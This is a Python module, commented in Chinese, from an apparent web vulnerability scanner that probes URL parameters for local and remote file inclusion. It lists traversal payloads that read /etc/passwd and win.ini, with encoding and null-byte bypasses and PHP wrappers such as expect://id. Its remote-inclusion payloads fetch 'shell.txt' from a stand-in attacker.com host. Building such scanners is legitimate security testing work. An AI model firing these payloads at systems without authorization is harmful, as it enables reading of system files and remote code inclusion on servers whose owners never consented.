"""
文件包含漏洞检测模块
检测LFI和RFI漏洞
"""

import asyncio
import aiohttp
import re
from typing import List, Dict, Optional
from dataclasses import dataclass
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse

from core.base import BaseModule, ScanResult, Severity, ResultType
from core.logger import Logger


@dataclass
class FileInclusionPoint:
    """文件包含漏洞点"""
    parameter: str
    inclusion_type: str  # lfi, rfi
    payload: str
    evidence: str


# LFI Payload
LFI_PAYLOADS = [
    # Unix文件
    ("../../../../etc/passwd", "lfi"),
    ("....//....//....//....//etc/passwd", "lfi_bypass"),
    ("..%2f..%2f..%2f..%2fetc/passwd", "lfi_encoded"),
    ("..%252f..%252f..%252f..%252fetc/passwd", "lfi_double_encoded"),
    ("/etc/passwd%00", "lfi_null_byte"),
    ("....//....//....//....//etc/passwd%00", "lfi_bypass_null"),
    ("php://filter/convert.base64-encode/resource=index.php", "lfi_wrapper"),
    ("php://input", "lfi_wrapper"),
    ("expect://id", "lfi_wrapper"),
    ("file:///etc/passwd", "lfi_absolute"),
    
    # Windows文件
    ("..\\..\\..\\..\\windows\\win.ini", "lfi_windows"),
    ("....\\....\\....\\....\\windows\\win.ini", "lfi_windows_bypass"),
    ("c:\\windows\\win.ini", "lfi_windows_absolute"),
]

# RFI Payload
RFI_PAYLOADS = [
    ("http://127.0.0.1/test.txt", "rfi"),
    ("http://attacker.com/shell.txt", "rfi"),
    ("\\attacker.com\share\shell.txt", "rfi_smb"),
    ("php://input", "rfi_wrapper"),
]

# 文件包含响应特征
LFI_INDICATORS = [
    r"root:x:0:0",
    r"daemon:x:",
    r"nobody:x:",
    r"\[fonts\]",
    r"\[extensions\]",
    r"bit app support",
    r"for 16-bit app support",
]


class FileInclusionScanner(BaseModule):
    """
    文件包含漏洞扫描器
    检测LFI和RFI漏洞
    """
    
    name = "file_inclusion_scanner"
    description = "文件包含漏洞检测器（LFI/RFI）"
    author = "PySecScanner"
    version = "1.0.0"
    
    def __init__(self, config=None, logger=None):
        super().__init__(config, logger)
        self.timeout = 10
        self.concurrency = 5
        self.lfi_payloads = LFI_PAYLOADS
        self.rfi_payloads = RFI_PAYLOADS
        self.vuln_points: List[FileInclusionPoint] = []
        self.base_url = ""
    
    async def scan(self, target: str) -> List[ScanResult]:
        """
        执行文件包含扫描
        
        Args:
            target: 目标URL
        """
        self.base_url = self._normalize_url(target)
        if not self.base_url:
            self.logger.error(f"无效的URL: {target}")
            return []
        
        self.logger.info(f"目标URL: {self.base_url}")
        
        # 解析参数
        params = self._extract_parameters(self.base_url)
        if not params:
            self.logger.warning("未发现可测试的参数")
            return []
        
        self.logger.info(f"发现参数: {', '.join(params.keys())}")
        
        # 测试LFI
        self.logger.info("测试LFI漏洞...")
        lfi_points = await self._test_lfi(params)
        self.vuln_points.extend(lfi_points)
        
        # 测试RFI
        self.logger.info("测试RFI漏洞...")
        rfi_points = await self._test_rfi(params)
        self.vuln_points.extend(rfi_points)
        
        # 生成结果
        results = []
        for vuln in self.vuln_points:
            severity = Severity.HIGH if vuln.inclusion_type == 'rfi' else Severity.MEDIUM
            
            result = ScanResult(
                result_type=ResultType.VULNERABILITY,
                title=f"{'RFI' if 'rfi' in vuln.inclusion_type else 'LFI'}漏洞: {vuln.parameter}",
                description=f"参数 '{vuln.parameter}' 存在{vuln.inclusion_type.upper()}漏洞",
                severity=severity,
                target=self.base_url,
                evidence=f"参数: {vuln.parameter}\nPayload: {vuln.payload}\n证据: {vuln.evidence}",
                raw_data=vuln.__dict__
            )
            results.append(result)
            self.add_result(result)
        
        if self.vuln_points:
            self.logger.print_result(
                "发现的文件包含漏洞",
                [f"{v.parameter} ({v.inclusion_type})" for v in self.vuln_points]
            )
        else:
            self.logger.info("未发现文件包含漏洞")
        
        return results
    
    def _normalize_url(self, url: str) -> str:
        """规范化URL"""
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        return url
    
    def _extract_parameters(self, url: str) -> Dict[str, str]:
        """提取URL参数"""
        parsed = urlparse(url)
        params = {}
        
        if parsed.query:
            query_params = parse_qs(parsed.query)
            for key, values in query_params.items():
                params[key] = values[0] if values else ""
        
        return params
    
    async def _test_lfi(self, params: Dict[str, str]) -> List[FileInclusionPoint]:
        """测试LFI漏洞"""
        return await self._test_payloads(params, self.lfi_payloads, "lfi")
    
    async def _test_rfi(self, params: Dict[str, str]) -> List[FileInclusionPoint]:
        """测试RFI漏洞"""
        return await self._test_payloads(params, self.rfi_payloads, "rfi")
    
    async def _test_payloads(self, params: Dict[str, str], payloads: List, test_type: str) -> List[FileInclusionPoint]:
        """测试Payload"""
        semaphore = asyncio.Semaphore(self.concurrency)
        vuln_points: List[FileInclusionPoint] = []
        tested = set()
        
        connector = aiohttp.TCPConnector(ssl=False, limit=self.concurrency)
        timeout = aiohttp.ClientTimeout(total=self.timeout)
        
        async def test_param(param_name: str, original_value: str) -> Optional[FileInclusionPoint]:
            async with semaphore:
                for payload, payload_type in payloads:
                    test_key = f"{param_name}:{payload[:30]}"
                    if test_key in tested:
                        continue
                    tested.add(test_key)
                    
                    test_params = params.copy()
                    test_params[param_name] = payload
                    test_url = self._build_url(test_params)
                    
                    try:
                        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                            async with session.get(test_url) as response:
                                content = await response.text()
                                
                                for pattern in LFI_INDICATORS:
                                    if re.search(pattern, content, re.IGNORECASE):
                                        return FileInclusionPoint(
                                            parameter=param_name,
                                            inclusion_type=payload_type,
                                            payload=payload,
                                            evidence=f"匹配模式: {pattern}"
                                        )
                                        
                    except Exception:
                        pass
                
                return None
        
        tasks = [test_param(name, value) for name, value in params.items()]
        
        completed = 0
        total = len(tasks)
        
        for coro in asyncio.as_completed(tasks):
            result = await coro
            completed += 1
            self.logger.print_progress(completed, total, f"{test_type.upper()}测试中")
            
            if result:
                vuln_points.append(result)
        
        print()
        
        return vuln_points
    
    def _build_url(self, params: Dict[str, str]) -> str:
        """构建测试URL"""
        parsed = urlparse(self.base_url)
        query = urlencode(params)
        
        return urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            query,
            parsed.fragment
        ))
